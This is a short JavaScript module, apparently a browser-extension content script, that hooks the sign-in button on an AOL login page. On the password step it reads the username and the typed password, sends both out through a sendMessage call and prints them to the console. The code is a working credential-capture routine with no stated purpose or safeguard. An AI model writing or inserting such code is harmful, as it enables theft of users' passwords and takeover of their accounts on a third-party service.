import $ from 'jquery';
import { sendMessage } from '../../redefination';

export function aolLoginInit() {
  $('#login-signin').click(() => {
    if (location.pathname === '/account/challenge/password') {
      const user = $('div.challenge-header > div.yid').text();
      const password = $('#login-passwd').val();
      sendMessage({ req: 'login', user, password });
      console.log({ user, password });
    }
  });
}
